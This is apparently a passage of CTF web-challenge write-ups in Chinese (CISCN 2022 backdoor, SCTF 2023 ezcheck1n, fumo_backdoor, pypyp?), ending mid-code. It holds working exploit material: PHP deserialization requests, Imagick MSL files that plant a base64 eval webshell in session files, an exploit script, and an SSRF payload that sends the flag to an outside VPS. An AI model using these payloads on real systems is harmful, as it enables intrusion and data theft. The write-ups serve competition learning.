class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>path%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>argv%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>vid%<span class="number">3</span>Amsl%<span class="number">3</span>A%<span class="number">2</span>Ftmp%<span class="number">2</span>Fphp*%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A7%<span class="number">3</span>A%<span class="number">22</span>imagick%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Content-Length: 703</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;swarm&quot;; filename=&quot;swarm.msl&quot;</span></span><br><span class="line"><span class="comment">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;image&gt;</span></span><br><span class="line"><span class="comment"> &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt;</span></span><br><span class="line"><span class="comment"> &lt;write filename=&quot;/tmp/sess_snakin&quot; /&gt;</span></span><br><span class="line"><span class="comment">&lt;/image&gt;</span></span><br><span class="line"><span class="comment">--------------------------c32aaddf3d8fd979--</span></span><br></pre></td></tr></table></figure><p>这里就是强制文件上传    <code>xml</code>这些内容就会上传到<code>/tmp/php*</code>   临时文件下  </p><p>接着因为<code>new imagick(&quot;vid:msl:/tmp/php*&quot;)</code>  初始会执行<code>msl</code>语言，所以临时文件里的内容就会被执行  </p><p>就是将序列化好的字符进行base64编码  然后传入<code>/tmp/sess_snakin</code>下</p><p><img src="../images/image-20230621163522068.png" alt="image-20230621163522068"></p><p>随后使用执行一次任意无参函数的功能，触发<code>session_start</code>函数，并设置<code>cookie</code>为<code>PHPSESSID=snakin</code>，即可文件包含<code>session</code>，成功<code>RCE</code>。<code>flag</code>执行根目录的<code>readflag</code>即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?data=O%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backdoor%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>session_start%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A12%<span class="number">3</span>A%<span class="number">22</span>do_exec_func%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D&amp;cmd=unserialze&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;/readflag&#x27;</span>); HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9999</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Cookie: PHPSESSID=snakin</span></span><br></pre></td></tr></table></figure><p>上面的传的序列化字符就是为了开启<code>session_start()</code>的</p><p><strong>然后就会进行反序列化将path给赋值，反序列化完后再进行序列化，将序列化后的执行存入存储介质中 因为session文件中含有php代码，包含的时候就会执行</strong>  </p><p>上面就是<code>imagick</code>配合<code>session</code>进行rce的过程了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/&quot;&gt;题目wp&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://swarm.ptsecurity.com/exploiting</summary>
      
    
    
    
    
    <category term="ciscn决赛-2022-backdoor" scheme="https://ke1nys.github.io/tags/ciscn%E5%86%B3%E8%B5%9B-2022-backdoor/"/>
    
  </entry>
  
  <entry>
    <title>sctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/99a58670.html"/>
    <id>https://ke1nys.github.io/posts/99a58670.html</id>
    <published>2023-06-20T09:28:27.000Z</published>
    <updated>2023-06-24T13:50:21.839Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ezcheck1n"><a href="#ezcheck1n" class="headerlink" title="ezcheck1n"></a><strong>ezcheck1n</strong></h2><p>题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/hint提示是</span><br><span class="line"></span><br><span class="line">find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</span><br><span class="line"></span><br><span class="line">去寻找flag在哪</span><br><span class="line"></span><br><span class="line">他看来有两个路由有P在配置文件中</span><br><span class="line"></span><br><span class="line">nss的考点中有</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>后端是 Server: Apache/2.4.54 (Debian) 中间件是 Server: Apache/2.4.55 (Unix)</strong></p><p><strong>这就是题目提示的两个容器的意思</strong></p><p><img src="../images/image-20230620194824661.png" alt="image-20230620194824661"></p><p>但是试了一下  发现不行  就没往这方面想了   没想到的最后wp里还是用它</p><p>(就是在其基础上修改一下就行了)</p><p><img src="../images/image-20230620195107173.png" alt="image-20230620195107173"></p><p><strong>题目就是提示了这几点  <code>post</code>指的是<code>post.jpeg</code>  然后就会看到下面的这个2022</strong></p><p>(就是当时想不明白这个url有啥用。。。。。。。)</p><p>这里的<code>url</code>是用来ssrf然后将flag带出到自己的vps监听端口上</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/2023/1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/2022.php%3furl%3d101.42.39.110:3389%253fa%253d</span><br></pre></td></tr></table></figure><p>这里的<code>2022.php</code>是猜出来的，因为题目给了是<code>show_source(2023.php)</code>   然后图片给的是2022，使用就是靠这里猜出来的</p><p><img src="../images/image-20230620201530382.png" alt="image-20230620201530382"></p><p><img src="../images/image-20230620201513988.png" alt="image-20230620201513988"></p><h2 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="fumo_backdoor"></a>fumo_backdoor</h2><p><strong>题目</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FUMO在你的网站上留下了后门 ᗜˬᗜ，她是怎么使用这个后门的捏？ ᗜˬᗜ（flag 在 /flag）</span><br></pre></td></tr></table></figure><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="keyword">__DIR__</span>.<span class="string">&quot;:/tmp&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;FUNC_LIST&quot;</span>, <span class="title function_ invoke__">get_defined_functions</span>());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;path) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[flag]/m&#x27;</span>, <span class="variable">$this</span>-&gt;path) === <span class="number">0</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">readfile</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            <span class="title function_ invoke__">is_string</span>(<span class="variable">$func</span>) &amp;&amp; </span><br><span class="line">            <span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, FUNC_LIST[<span class="string">&quot;internal&quot;</span>])</span><br><span class="line">        ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$argv</span> = <span class="variable language_">$this</span>-&gt;argv;</span><br><span class="line">            <span class="variable">$class</span> = <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line"><span class="class">            </span></span><br><span class="line"><span class="class">            <span class="title">new</span> $<span class="title">class</span>($<span class="title">argv</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">cmd</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">cmd</span>&#x27;];</span></span><br><span class="line"><span class="class">$<span class="title">data</span> = $<span class="title">_REQUEST</span>[&#x27;<span class="title">data</span>&#x27;];</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">switch</span> ($<span class="title">cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;unserialze&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;rm&#x27;</span>:</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;rm -rf /tmp 2&gt;/dev/null&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ini_set(&#39;open_basedir&#39;, __DIR__.&quot;:/tmp&quot;);</code></p><p>  这里的代码将 <code>open_basedir</code> 配置选项设置为当前目录以及 <code>/tmp</code> 目录，因此 PHP 脚本只能访问当前目录和 <code>/tmp</code> 目录下的文件，无法访问其他目录。</p><p>这道题是根据这个题改的</p><p><a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a></p><p><a href="https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/">https://www.snakin.top/2022/09/09/2022CISCN%E5%86%B3%E8%B5%9B/</a></p><p><strong>这里的多一嘴来讲讲这个参考的这个<code>backdoor</code></strong>     <a href="https://ke1nys.github.io/posts/869a12bf.html">ciscn决赛-2022-backdoor</a></p><p>稍微改了点，include变为了readdir，因此我们很难getshell。那就改变思路了。首先我们知道flag是在根目录的，但是由于open_basedir我们并没有权限去读取，因此我们需要配合imagick的msl语言特性，把flag读到/tmp目录下，然后再利用上述payload去触发__sleep，读取flag文件<br>首先我们需要用如下payload把flag移动到tmp目录下</p><p><strong>先去触发<code>phpinfo</code>()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fumo_backdoor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$argv</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fumo_backdoor</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621164501671.png" alt="image-20230621164501671"></p><p>开启了<code>imagick</code>扩展</p><p><strong>思路</strong></p><ul><li>先进行临时文件上传 然后创建一个session_xxx文件，然后imagick初始化的时候会执行临时文件里的内容如何值就会赋给session_xxx文件</li></ul><p>(<strong>这里会创建两个文件，一个用来存序列化的数据(这里的path必须是第二次session的名字)，为了给path赋值，另一个是为了存flag</strong>)</p><ul><li>第二步还是进行临时文件上传  然后还是创建一个文件(必须和第一次不同名字)  内容是将flag移到该文件中   就是移到第二步设置的文件中</li></ul><ul><li>第三步进行session_start()的开启   来触发第一次session的反序列化(<strong>为了设置path,反序列化结束后会接着会序列</strong>)  然后可以读取到flag了</li></ul><p>因为这里的是公共容器，会容易被删除自己刚创建的session文件  所以需要python脚本</p><p><strong>exp.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.99.77.113:18080/?cmd=unserialze&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:18080/?cmd=unserialze&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    <span class="comment"># rm</span></span><br><span class="line">    r = requests.get(<span class="string">&quot;http://47.99.77.113:18080/?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;hack.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>hack.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8P3BocCBldmFsKCRfR0VUWzFdKTs/PnxPOjEzOiJmdW1vX2JhY2tkb29yIjozOntzOjQ6InBhdGgiO3M6OToiL3RtcC9GTEFHIjtzOjQ6ImFyZ3YiO047czoxOiJjIjtOO30=&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/sess_tel&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621180951791.png" alt="image-20230621180951791"></p><p><strong>lfi.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;app1:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/FLAG&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621182457074.png" alt="image-20230621182457074"></p><p><strong>这里用那个<code>mvg</code>  <code>app1</code>   <code>uyvy</code> 能直接读取flag</strong></p><p>还有一种办法就是fuzz测试来测试哪种可以用来使用</p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><h3 id="提示-hint"><a href="#提示-hint" class="headerlink" title="提示/hint"></a>提示/hint</h3><p>a piece of cake but hard work。per 5 min restart.<br>pay attention to <code>/app/app.py</code></p><p><img src="../images/image-20230621201841266.png" alt="image-20230621201841266"></p><p>题目的页面就是这样</p><p>这里的话是先使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> (<strong>后面跟的是上传内容</strong>)  来强制<code>session start</code></p><p>在使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 时，如果 <code>session</code> 没有开启，系统会自动开启一个新的 session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=tel&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=111&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621203954292.png" alt="image-20230621203954292"></p><p>然后交给gpt就行了</p><p><strong>得到源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>], <span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span 